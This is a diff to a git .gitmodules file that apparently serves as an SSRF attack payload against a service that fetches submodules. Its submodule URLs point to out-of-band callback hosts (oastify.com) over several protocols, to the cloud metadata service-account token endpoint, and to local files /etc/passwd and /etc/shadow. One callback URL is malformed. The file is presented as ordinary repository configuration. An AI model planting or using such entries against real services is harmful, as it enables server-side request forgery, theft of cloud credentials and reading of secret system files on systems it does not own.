@@ -1,9 +1,24 @@
-[submodule "evil1"]
-	path = evil_dir
-	url = https://sc86bjxeg0c8st8t0xquwf5v9mfd34rt.oastify.com/submodule-fetch?proof=evil1
-[submodule "metafetch"]
-	path = metadir
+[submodule "burp-https"]
+	path = burp_https_dir
+	url = https://hufvt8f3ypuxaiqiim8je4nkrbx2lw9l.oastify.com/submodule-https-fetch?via=dataform
+[submodule "burp-http"]
+	path = burp_http_dir
+	url = http://hufvt8f3ypuxaiqiim8je4nkrbx2lw9l.oastify.com/submodule-http-fetch
+[submodule "burp-git"]
+	path = burp_git_dir
+	url = git://hufvt8f3ypuxaiqiim8je4nkrbx2lw9l.oastify.com/some-repo
+[submodule "burp-ssh"]
+	path = burp_ssh_dir
+	url = git@hufvt8f3ypuxaiqiim8je4nkrbx2lw9l.oastifyepo
+[submodule "metadata"]
+	path = metadata_dir
 	url = http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
-[submodule "fileproto"]
-	path = filedir
+[submodule "file-passwd"]
+	path = file_passwd_dir
 	url = file:///etc/passwd
+[submodule "file-shadow"]
+	path = file_shadow_dir
+	url = file:///etc/shadow
+[submodule "burp-via-dns-only"]
+	path = dns_only_dir
+	url = https://dns-trigger-test.hufvt8f3ypuxaiqiim8je4nkrbx2lw9l.oastify.com/probe
